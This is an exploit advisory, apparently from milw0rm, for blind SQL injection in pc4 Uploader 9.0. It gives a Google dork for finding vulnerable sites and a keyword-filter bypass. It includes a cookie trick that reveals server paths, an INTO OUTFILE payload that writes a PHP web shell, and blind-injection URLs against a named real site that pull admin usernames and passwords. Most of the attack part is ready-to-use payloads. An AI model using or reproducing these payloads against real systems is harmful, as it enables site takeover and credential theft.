@@ -1,0 +1,103 @@
+                  ||          ||   | ||        
+           o_,_7 _||  . _o_7 _|| q_|_||  o_w_,
+          ( :   /    (_)    /           (   .  
+
+
+=By: 	Qabandi
+=Email:	iqa[a]hotmail.fr
+
+	From Kuwait PEACE
+
+=Vuln:		pc4arb - pc4 Uploader <= 9.0 Blind SQL injection
+=INFO:		http://pc4arb.com/product-13.html
+=BUY:  		http://pc4arb.com/deal-13.html
+=DORK:		intext:"Powered by Pc4Uploader  v9.0"
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-SQL-Filter-Bypass@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+----------Vulnerable code@ "./code.php"----------------------------------------
+function filter_sql( $inputsql )
+{
+    $regsql = "(delete)|(update)|(union)|(insert)";
+    return eregi_replace( $regsql, "", $inputsql );
+}
+------------------END----------------------------------------------------------
+-=-===--=-=-==-=-==-=-=-=-=-=-=-=-POC-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+$Q = "UNIunionON";
+filter_sql($Q);
+echo $Q;
+
+--
+Result = UNION
+
+We can use this to upload a file, using the "dumpfile" and "outfile" Mysql functions.
+
+POC:-
+
+conditions: magic_quotes_gpc = off // 0777 chmoded folder // location of folder.
+
+To get location in server, we can generate an error using the STYLE cookie handler, to do this we need to set tempst=qabandi.
+
+javascript:document.cookie="tempst=qabandi";
+
+Refresh,
+
+you will get the following:
+
+Warning: file(templates/Qabandi/main_block.html) [function.file]: failed to open stream: No such file or directory in /home/XXXXXXX/public_html/function.php on line 33
+
+now we have the location in server, "/home/XXXXXXX/public_html/"
+
+"/home/XXXXXXX/public_html/upfiles/" <--- 99% of the time its chmoded 0777.
+
+now the exploit:
+
+http://localhost/pc4up/code.php?load=banner&id=-1 UNunionION select 1,2,3,'<? include($Q);?>',5,6,7,8,9 into outfile '/home/XXXXXXX/public_html/upfiles/qabandi.php'
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-BLIND SQL@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+----------Vulnerable code@ "./code.php"-----------------------------------------
+
+if ( $_GET['load'] == "banner" )
+{
+    $idx = $_GET['id'];
+    $idx = strip_tags( $idx );
+    $idx = filter_sql( $idx );/// <------ SIMPLY bypassed by using "unUNIONion" ;)
+    if ( !( $query_banner = mysql_query( "SELECT * FROM banners WHERE id={$idx}" ) ) )
+    {
+        exit( "Query failed" );
+    }
+    $x = mysql_fetch_row( $query_banner );
+    $url = $x[2];
+    $visits = $x[5];
+    if ( !( $query = mysql_query( "UPDATE banners SET visits=visits+1 WHERE id ={$idx}" ) ) )
+    {
+        exit( "Query failed" );
+    }
+    header( "Location: {$url}" );
+}
+
+
+--------------:PoC:-------------
+conditions:		admin must have added a banner using the "add banner" feature. the banner ID must be valid.
+
+
+Blind SQL DEMO:-
+http://upload.traidnt.net/code.php?load=banner&id=1 and substring(@@version,1,1)=4 <-- TRUE!  (MySQL version 4)
+
+
+http://upload.traidnt.net/code.php?load=banner&id=1 and substring(@@version,1,1)=5 <-- BLANK
+
+
+To get info:
+
+http://upload.traidnt.net/code.php?load=banner&id=1 and ascii(substring((SELECT concat(username,char(62),password) from admin limit 0,1),1,1))>95
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+-=-=-=-==-=LA tsta3mloha 3la elmowaqi3 el islamiya=-=-=-=-=-=-=-=-
+=-=-=-=-==-=-=-=-=-=-No-More---Private=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Salamz: Killer Hack, Mr.Mn7os, Ghost-r00t, All muslim hackers.
+
+# milw0rm.com [2009-05-18]
